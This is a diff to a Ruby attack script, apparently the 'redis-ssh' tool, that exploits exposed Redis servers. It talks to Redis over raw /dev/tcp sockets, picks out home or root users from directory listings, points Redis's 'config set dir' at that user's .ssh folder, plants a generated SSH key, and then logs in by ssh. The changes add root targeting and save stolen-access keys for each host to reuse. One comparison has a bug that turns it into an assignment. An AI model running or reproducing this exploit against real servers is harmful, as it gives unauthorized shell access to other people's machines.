@@ -1,6 +1,7 @@
 #! /usr/bin/ruby
 
 require 'optparse'
+require 'fileutils'
 
 #Write banner
 puts <<-'EOF'
@@ -14,7 +15,7 @@ puts <<-'EOF'
 By Levitating
 https://github.com/LevitatingBusinessMan/redis-ssh
 
-Version 1.0.0
+Version 1.0.1
 
 EOF
 
@@ -98,18 +99,28 @@ end
 
 def send msg
 	Log.req msg if @opts[:verbose]
-	`exec 5<>/dev/tcp/#{@opts[:host]}/#{@opts[:port]} && printf '#{msg}\n' >&5 && timeout #{@opts[:timeout]} cat <&5`
 	
+	out = `exec 5<>/dev/tcp/#{@opts[:host]}/#{@opts[:port]} && printf '#{msg}\n' >&5 && timeout #{@opts[:timeout]} cat <&5`
+	Log.warn "Received empty response, increasing the timeout may help" if out.empty?
+	return out
+
 	#`echo "#{msg}" | timeout --preserve-status 1 nc #{@opts[:host]} #{@opts[:port]}`
 end
 
 # Check if netcat is present
 #return puts("NetCat is not installed") if !system("which nc > /dev/null 2>&1")
 
-Log.info "When this script fails increasing the timeout may help."
+host_dir = File.expand_path "~/.local/share/redis_ssh/#{@opts[:host]}"
+if File.file? "#{host_dir}/id_rsa" and File.file? "#{host_dir}/user"
+	user = File.read "#{host_dir}/user"
+	Log.succ "Discovered existing private key for this host"
+	print "Do you want to ssh immeditaly as #{user}? (y/n) "
+	answer = gets.chomp
+	exec "ssh -i #{host_dir}/id_rsa #{user}@#{@opts[:host]} -p #{@opts[:sshport]}" if answer == "y" or answer == "yes"
+end
 
 #Check if up
-Log.info "Check if #{@opts[:host]} is accessible"
+Log.info "Check if port #{@opts[:port]} is open"
 # Because the status code isn't 0 when the host doesnt not respond with anything we allow all non 1 exit codes
 return Log.err "#{@opts[:host]}:#{@opts[:port]} not responding" if
 `timeout --preserve-status #{@opts[:timeout]} sh -c 'cat < /dev/tcp/#{@opts[:host]}/#{@opts[:port]}' > /dev/null 2>&1; echo $?` == "1\n"
@@ -148,25 +159,41 @@ if @info["role"] == "slave"
 end
 
 @vuln = false
+@revealed_users = []
 def sdir dir
 	return if !dir
 	dirarr = dir.split("/").reject{|x|x.empty?}
-	if dirarr[0] == "home"
-		user = dirarr[1]
-		Log.succ "Directory reveals user #{user}"
-		
-		# No need to ask for input in check mode
-		if @opts[:check]
-			@vuln = true
-			return
-		end
+	if dirarr[0] == "home" or dirarr[0] = "root"
+		user = dirarr[1] if dirarr[0] == "home"
+		user = "root" if dirarr[0] == "root"
 
-		if @opts[:user] != user
-			print "Do you want to attack user #{user}? (y/n) "
-			answer = gets.chomp
-			if answer == "y" or answer == "yes"
-				@opts[:user] = user
-				@opts[:dir] = "/home/#{user}/.ssh" if !@opts[:dir]
+		# This array makes sure we only prompt for a user once
+		if !@revealed_users.include? user
+			Log.succ "Directory reveals user #{user}"
+			@revealed_users.push(user)
+
+			# No need to ask for input in check mode
+			if @opts[:check]
+				@vuln = true
+				return
+			end
+
+			# If this user isnt set prompt to set it
+			if @opts[:user] != user
+				print "Do you want to attack user #{user}? (y/n) "
+				answer = gets.chomp
+				if answer == "y" or answer == "yes"
+					@opts[:user] = user
+					
+					if !@opts[:dir]
+						if user == "root"
+							@opts[:dir] = "/root/.ssh"
+						else
+							@opts[:dir] = "/home/#{user}/.ssh" 
+						end
+					end
+
+				end
 			end
 		end
 	end
@@ -211,6 +238,8 @@ elsif !@opts[:dir]
 	@opts[:dir] = "/home/#{user}/.ssh"
 end
 
+File.write "#{host_dir}/user", @opts[:user]
+
 Log.info "Setting configuration directory"
 out = send "config set dir #{@opts[:dir]}"
 Log.res out if @opts[:verbose]
@@ -228,10 +257,13 @@ Log.res out if @opts[:verbose]
 return Log.err "Failed to save value on the server" if out != "+OK\r\n"
 =end
 
+#Create dir to save key
+FileUtils.mkdir_p host_dir
+
 # Generate ssh keypair
 Log.info "Generating new ssh keypair"
-return Log.err "Error generating keypair" if `ssh-keygen -t rsa -N "" -q -f /tmp/key -C #{@opts[:user]}@#{@opts[:host]} <<< y; echo $?`[-2] == "1"
-pubkey = File.open("/tmp/key.pub").read
+return Log.err "Error generating keypair" if `ssh-keygen -t rsa -N "" -q -f #{host_dir}/id_rsa -C #{@opts[:user]}@#{@opts[:host]} <<< y; echo $?`[-2] == "1"
+pubkey = File.read "#{host_dir}/id_rsa.pub"
 return Log.err "Error generating keypair: " + pubkey if !pubkey.start_with? "ssh-rsa"
 
 # Checking if we can set a key
@@ -255,4 +287,4 @@ Log.res out if @opts[:verbose]
 return Log.err "Failed to save database" if out != "+OK\r\n"
 
 Log.info "Running ssh"
-exec "ssh -i /tmp/key #{@opts[:user]}@#{@opts[:host]} -p #{@opts[:sshport]}"
+exec "ssh -i #{host_dir}/id_rsa #{@opts[:user]}@#{@opts[:host]} -p #{@opts[:sshport]}"
